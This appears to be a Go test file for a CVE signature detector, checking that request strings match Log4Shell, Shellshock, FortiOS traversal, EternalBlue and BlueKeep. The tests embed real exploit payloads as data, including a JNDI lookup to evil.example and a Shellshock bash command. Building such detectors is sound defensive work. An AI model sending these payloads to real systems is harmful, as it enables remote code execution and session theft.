package cve

import "testing"

func TestMatchPayloadLog4Shell(t *testing.T) {
	req := "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1\r\nUser-Agent: ${jndi:dns://x}\r\n\r\n"
	hits := MatchPayload("http", req)
	if len(hits) == 0 {
		t.Fatal("expected Log4Shell match")
	}
	found := false
	for _, h := range hits {
		if h.ID == "CVE-2021-44228" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CVE-2021-44228; got %+v", hits)
	}
}

func TestMatchPayloadShellshock(t *testing.T) {
	req := "GET / HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -c id\r\n\r\n"
	if hits := MatchPayload("http", req); len(hits) == 0 || hits[0].ID != "CVE-2014-6271" {
		t.Errorf("expected Shellshock; got %+v", hits)
	}
}

func TestMatchPayloadApplianceTraversal(t *testing.T) {
	req := "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1\r\n\r\n"
	if hits := MatchPayload("fortinet", req); len(hits) == 0 || hits[0].ID != "CVE-2018-13379" {
		t.Errorf("expected FortiOS traversal; got %+v", hits)
	}
}

func TestMatchPayloadHTTPMatchesHTTPS(t *testing.T) {
	req := "POST / HTTP/1.1\r\n\r\nclass.module.classLoader.x"
	if hits := MatchPayload("https", req); len(hits) == 0 {
		t.Error("http-layer CVE should also match https handler")
	}
}

func TestMatchPayloadNoFalsePositive(t *testing.T) {
	req := "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
	if hits := MatchPayload("http", req); len(hits) != 0 {
		t.Errorf("benign request matched a CVE: %+v", hits)
	}
}

func TestMatchPayloadSMBAndRDP(t *testing.T) {
	// EternalBlue: the "\PIPE\" tree path appears as ASCII in the SMB1
	// request (case-insensitive match against the lowercased signature).
	smb := "\xffSMB" + "....\\PIPE\\srvsvc...."
	if hits := MatchPayload("smb", smb); len(hits) == 0 || hits[0].ID != "CVE-2017-0144" {
		t.Errorf("expected EternalBlue on smb; got %+v", hits)
	}
	// BlueKeep: the rogue MS_T120 channel name in the MCS Connect PDU.
	rdp := "\x03\x00....MS_T120\x00...."
	if hits := MatchPayload("rdp", rdp); len(hits) == 0 || hits[0].ID != "CVE-2019-0708" {
		t.Errorf("expected BlueKeep on rdp; got %+v", hits)
	}
	// Removed records must not resurface.
	if _, ok := Lookup("CVE-2014-0160"); ok {
		t.Error("Heartbleed should have been removed (not detectable post-TLS-decrypt)")
	}
	if _, ok := Lookup("CVE-2020-0796"); ok {
		t.Error("SMBGhost should have been removed (not substring-detectable)")
	}
}

func TestForServiceAndLookup(t *testing.T) {
	if recs := ForService("http"); len(recs) == 0 {
		t.Error("expected http CVEs")
	}
	rec, ok := Lookup("CVE-2021-44228")
	if !ok || rec.Name != "Log4Shell" {
		t.Errorf("lookup Log4Shell: %+v ok=%v", rec, ok)
	}
	if _, ok := Lookup("CVE-0000-0000"); ok {
		t.Error("unknown CVE should not be found")
	}
}
